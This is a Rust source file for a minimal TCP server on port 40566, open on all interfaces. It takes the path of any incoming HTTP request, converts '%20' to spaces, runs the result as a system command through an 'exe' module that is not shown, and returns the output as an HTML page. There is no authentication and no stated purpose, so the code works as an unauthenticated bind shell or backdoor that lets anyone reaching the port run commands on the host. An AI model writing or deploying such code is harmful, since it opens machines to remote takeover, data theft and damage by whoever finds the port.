use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};

mod exe;
use exe::execute;

struct Con {
    listener: TcpListener,
    stream: String,
}

impl Con {
    fn connect() -> io::Result<Self> {
        let listener = TcpListener::bind("0.0.0.0:40566")?;

        Ok(Self {
            listener,
            stream: String::new(),
        })
    }

    fn start(&mut self) -> io::Result<()> {
        let mut buffer = [0; 512];
        for stream in self.listener.incoming() {
            let mut s = stream?;

            if let Ok(_n) = s.read(&mut buffer) {};

            self.stream = String::from_utf8_lossy(&buffer).to_string();

            if let Some(cmd) = self.get_cmd() {
                match self.exec_cmd(s, cmd) {
                    Ok(_) => {}
                    Err(_) => continue,
                }
            }
        }
        Ok(())
    }

    fn get_cmd(&self) -> Option<std::str::Split<&str>> {
        let http_idx = match self.stream.find("HTTP") {
            Some(idx) => idx - 1,
            None => return None,
        };

        let unescaped = &self.stream[5..http_idx];
        Some(unescaped.split("%20"))
    }

    fn exec_cmd(&self, s: TcpStream, cmd: std::str::Split<&str>) -> io::Result<()> {
        let cmd = cmd.collect::<Vec<&str>>().join(" ");

        let out = execute(&cmd)?;

        Self::return_out(s, &out);
        println!("{}", &out);

        Ok(())
    }

    fn return_out(mut stream: TcpStream, out: &str) {
        let mut content = String::new();

        content.push_str("<!DOCTYPE HTML>\n");
        content.push_str("<html>\n");
        content.push_str("<body>");
        out.split('\n').for_each(|c| {
            content.push_str(&format!("<li>{}</li>\n", c));
        });

        let status = String::from("HTTP/1.1 200 OK\r\n\r\n");
        let mut response = status.as_bytes().to_vec();
        response.extend(content.bytes());
        stream.write_all(&response).unwrap();
        stream.flush().unwrap();
    }
}

fn main() -> io::Result<()> {
    let mut con = Con::connect()?;
    con.start()?;
    Ok(())
}
